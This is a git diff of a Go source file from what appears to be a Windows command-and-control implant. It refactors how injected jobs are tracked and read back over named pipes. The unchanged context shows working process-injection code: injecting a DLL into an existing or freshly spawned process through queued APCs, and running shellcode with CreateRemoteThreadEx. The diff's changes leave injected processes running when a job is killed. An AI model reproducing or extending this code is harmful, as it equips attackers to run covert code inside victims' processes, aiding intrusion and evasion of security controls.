@@ -1,3 +1,5 @@
+//go:build windows
+
 package command
 
 import (
@@ -37,10 +39,9 @@ var (
 type job struct {
 	jid         int
 	pid         uint32
-	tid         uint32
-	isJobSpawn  bool
 	description string
 	pipeName    string
+	sleepTime   uint16
 	stopCh      chan bool
 }
 
@@ -49,8 +50,6 @@ var jobCnt = 0
 
 // spawn and inject get thread/process id, but we need it in handleJob
 var currentPid uint32 = 0
-var currentTid uint32 = 0
-var isJobSpawn = true
 
 func removeJob(jid int) {
 	for i, job := range jobs {
@@ -73,7 +72,6 @@ func InjectDll(b []byte) error {
 		return errors.New(fmt.Sprintf("OpenProcess error: %s", err))
 	}
 	currentPid = pid
-	isJobSpawn = false
 	//return createRemoteThread(processHandle, dll)
 
 	// callUserAPC deploy
@@ -84,7 +82,6 @@ func InjectDll(b []byte) error {
 		currentPid = 0
 		return err
 	}
-	currentTid = threadIds[0]
 	defer windows.CloseHandle(threadHandle)
 	defer windows.CloseHandle(processHandle)
 	return callUserAPC(processHandle, threadHandle, dll)
@@ -176,8 +173,6 @@ func spawnAndInjectDll(dll []byte, program string, args string) error {
 	}
 	currentPid = procInfo.ProcessId
 	// kill spawn will kill process, so threadId is useless
-	currentTid = procInfo.ThreadId
-	isJobSpawn = true
 	defer windows.CloseHandle(procInfo.Process)
 	defer windows.CloseHandle(procInfo.Thread)
 	return callUserAPC(procInfo.Process, procInfo.Thread, dll)
@@ -242,7 +237,6 @@ func createRemoteThread(processHandle windows.Handle, shellcode []byte) error {
 	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx != windows.SEVERITY_SUCCESS {
 		return errors.New(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx: %s", errCreateRemoteThreadEx))
 	}
-	currentTid = threadId
 	_ = windows.CloseHandle(processHandle)
 	return nil
 }
@@ -267,24 +261,15 @@ func HandlerJobAsync(b []byte) error {
 	j := job{
 		jid:         jobCnt,
 		pid:         currentPid,
-		tid:         currentTid,
 		description: string(commandType),
 		pipeName:    string(pipeName),
 		stopCh:      stopCh,
-		isJobSpawn:  isJobSpawn,
+		sleepTime:   sleepTime,
 	}
 	jobCnt++
 	jobs = append(jobs, j)
 
-	// change it async
 	go func() {
-		// sleep time some time is small, some time is huge, so set it to Microsecond
-		//fmt.Printf("Sleep time: %d\n", sleepTime)
-		if sleepTime < 10 {
-			time.Sleep(time.Second * time.Duration(sleepTime))
-		} else {
-			time.Sleep(time.Microsecond * time.Duration(sleepTime))
-		}
 		result, err := readNamedPipe(j)
 		if err != nil {
 			ErrorMessage(err.Error())
@@ -319,26 +304,8 @@ func KillJob(b []byte) error {
 	jid := packet.ReadShort(b)
 	for _, j := range jobs {
 		if j.jid == int(jid) {
+			// don't kill the process, just disconnect the pipe
 			j.stopCh <- true
-			if j.isJobSpawn {
-				processHandle, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, j.pid)
-				if err != nil {
-					return err
-				}
-				err = windows.TerminateProcess(processHandle, 0)
-				if err != nil {
-					return err
-				}
-			} else {
-				threadHandle, err := windows.OpenThread(windows.THREAD_TERMINATE, false, j.tid)
-				if err != nil {
-					return err
-				}
-				_, _, err = terminateThread.Call(uintptr(unsafe.Pointer(&threadHandle)), 0)
-				if err != nil {
-					return err
-				}
-			}
 		}
 	}
 	return nil
@@ -348,6 +315,7 @@ func readNamedPipe(j job) (string, error) {
 	pipe, err := winio.DialPipe(j.pipeName, nil)
 	if err != nil {
 		// try it twice in case of sleep time is too short
+		time.Sleep(time.Second * 5)
 		pipe, err = winio.DialPipe(j.pipeName, nil)
 		if err != nil {
 			return "", errors.New(fmt.Sprintf("DialPipe error: %s", err))
@@ -357,9 +325,10 @@ func readNamedPipe(j job) (string, error) {
 	result := ""
 	buf := make([]byte, 512)
 	for {
+		time.Sleep(time.Millisecond * time.Duration(j.sleepTime))
 		select {
 		case <-j.stopCh:
-			return "", errors.New(fmt.Sprintf("job %d canceled", j.jid))
+			return result + fmt.Sprintf("\njob %d canceled", j.jid), nil
 		default:
 			n, err := pipe.Read(buf)
 			// if you kill the process, pipe will be closed and there will receive an EOF
